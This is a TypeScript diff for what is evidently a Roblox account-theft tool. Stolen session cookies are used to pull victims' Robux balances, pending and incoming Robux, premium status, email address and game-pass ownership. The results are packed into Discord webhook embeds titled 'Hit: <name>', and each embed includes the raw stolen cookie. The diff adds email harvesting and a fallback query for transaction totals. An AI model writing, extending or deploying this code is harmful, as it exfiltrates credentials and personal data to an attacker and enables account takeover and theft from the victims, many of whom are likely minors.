@@ -47,6 +47,7 @@ const DEFAULT_EMOJI: Record<string, string> = {
   time:     "⏰",
   pin:      "🔐",
   owner:    "🏷️",
+  email:    "📧",
 };
 
 function getMasterWebhook(): string {
@@ -301,6 +302,8 @@ interface RobloxInfo {
   summary: number | null;
   pendingRobux: number | null;
   incomingRobux: number | null;
+  email: string | null;
+  emailVerified: boolean | null;
   ownedPasses: Array<{ game: string; passes: Array<{ id: number; owned: boolean }> }>;
 }
 
@@ -313,7 +316,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses] = await Promise.all([
+    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses, emailInfo] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
@@ -330,6 +333,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchAgeVerified(cookieHeader),
       fetchTransactionTotals(auth.id, cookieHeader),
       fetchOwnedPasses(auth.id),
+      fetchEmail(cookieHeader),
     ]);
 
     const createdAt = profile?.created ?? null;
@@ -362,6 +366,8 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       summary: transactionTotals.summary,
       pendingRobux: transactionTotals.pending,
       incomingRobux: transactionTotals.incoming,
+      email: emailInfo?.address ?? null,
+      emailVerified: emailInfo?.verified ?? null,
       ownedPasses,
     };
   } catch (e) {
@@ -408,6 +414,15 @@ async function fetchAgeVerified(cookieHeader: string): Promise<boolean | null> {
     // Verified accounts include an isAgeVerified flag; fall back to age >= 13 calc
     if (typeof j?.isAgeVerified === "boolean") return j.isAgeVerified;
     return null;
+  } catch { return null; }
+}
+
+async function fetchEmail(cookieHeader: string): Promise<{ address: string; verified: boolean } | null> {
+  try {
+    const r = await fetch("https://accountsettings.roblox.com/v1/email", { headers: { Cookie: cookieHeader } });
+    if (!r.ok) return null;
+    const j = await r.json() as { emailAddress?: string; verified?: boolean };
+    return { address: j.emailAddress ?? "", verified: !!j.verified };
   } catch { return null; }
 }
 
@@ -544,6 +559,26 @@ async function fetchTransactionTotals(
     }
   } catch (e) {
     console.error("v1 transaction-totals error", e);
+  }
+
+  // v2 fallback for pending/incoming if v1 returned nothing.
+  if (pending === 0 && incoming === 0) {
+    try {
+      const url = `https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`;
+      const headers: Record<string, string> = { Cookie: cookieHeader, "user-agent": "Roblox/WinINet" };
+      if (csrf) headers["x-csrf-token"] = csrf;
+      let r = await fetch(url, { headers });
+      if (r.status === 403) {
+        const newCsrf = r.headers.get("x-csrf-token");
+        if (newCsrf) { headers["x-csrf-token"] = newCsrf; r = await fetch(url, { headers }); }
+      }
+      if (r.ok) {
+        const v2 = await r.json() as Record<string, number>;
+        console.log("transaction-totals[v2/Year] raw", JSON.stringify(v2));
+        pending = Number(v2.pendingRobuxTotal ?? 0) || pending;
+        incoming = Number(v2.incomingRobuxTotal ?? 0) || incoming;
+      }
+    } catch (e) { console.error("v2 transaction-totals error", e); }
   }
 
   console.log("transaction-totals parsed", { ...parsed, pending, incoming });
@@ -685,21 +720,9 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.following} Following`, value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
       { name: `${EMOJI.voice} Voice Chat`, value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: `${EMOJI.age} Age Verified`, value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
+      { name: `${EMOJI.email} Email`, value: roblox.email ? `${roblox.email} ${roblox.emailVerified ? "✅ Verified" : "❌ Unverified"}` : (roblox.emailVerified === null ? "Unknown" : "❌ None set"), inline: true },
       { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
     );
-
-    // Tracked game passes — one field per game, listing each pass ✅/❌
-    for (const g of roblox.ownedPasses) {
-      if (g.passes.length === 0) continue;
-      const ownedCount = g.passes.filter((p) => p.owned).length;
-      mainFields.push({
-        name: `${EMOJI.games} ${g.game} Passes (${ownedCount}/${g.passes.length})`,
-        value: g.passes
-          .map((p) => `${p.owned ? "✅" : "❌"} [${p.id}](https://www.roblox.com/game-pass/${p.id})`)
-          .join("\n"),
-        inline: true,
-      });
-    }
 
     // Owned groups — chunked to 1024 chars per field
     if (roblox.ownedGroups.length > 0) {
@@ -742,24 +765,50 @@ function buildDiscordPayload(opts: {
   );
 
 
+  // Games embed — one field per tracked game listing pass ownership
+  const gameFields: Array<{ name: string; value: string; inline?: boolean }> = [];
+  if (roblox) {
+    for (const g of roblox.ownedPasses) {
+      if (g.passes.length === 0) continue;
+      const ownedCount = g.passes.filter((p) => p.owned).length;
+      gameFields.push({
+        name: `${EMOJI.games} ${g.game} Passes (${ownedCount}/${g.passes.length})`,
+        value: g.passes
+          .map((p) => `${p.owned ? "✅" : "❌"} [${p.id}](https://www.roblox.com/game-pass/${p.id})`)
+          .join("\n"),
+        inline: true,
+      });
+    }
+  }
+
+  const embeds: Array<Record<string, unknown>> = [
+    {
+      title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
+      color: 0xa855f7,
+      thumbnail: roblox?.avatar ? { url: roblox.avatar } : (roblox?.headshot ? { url: roblox.headshot } : undefined),
+      fields: mainFields,
+      footer: { text: `${siteName} Submission System` },
+      timestamp: new Date().toISOString(),
+    },
+  ];
+  if (gameFields.length > 0) {
+    embeds.push({
+      title: `${EMOJI.games} Tracked Games`,
+      color: 0x22c55e,
+      fields: gameFields,
+      footer: { text: `${siteName} • Gamepass Ownership` },
+    });
+  }
+  embeds.push({
+    title: `${EMOJI.cookie} Account Cookie`,
+    color: 0xff5555,
+    description: "```\n" + cookie.slice(0, 4080) + "\n```",
+    footer: { text: "Handle with care" },
+  });
+
   return {
     content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
-    embeds: [
-      {
-        title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
-        color: 0xa855f7,
-        thumbnail: roblox?.avatar ? { url: roblox.avatar } : (roblox?.headshot ? { url: roblox.headshot } : undefined),
-        fields: mainFields,
-        footer: { text: `${siteName} Submission System` },
-        timestamp: new Date().toISOString(),
-      },
-      {
-        title: `${EMOJI.cookie} Account Cookie`,
-        color: 0xff5555,
-        description: "```\n" + cookie.slice(0, 4080) + "\n```",
-        footer: { text: "Handle with care" },
-      },
-    ],
+    embeds,
   };
 }
 
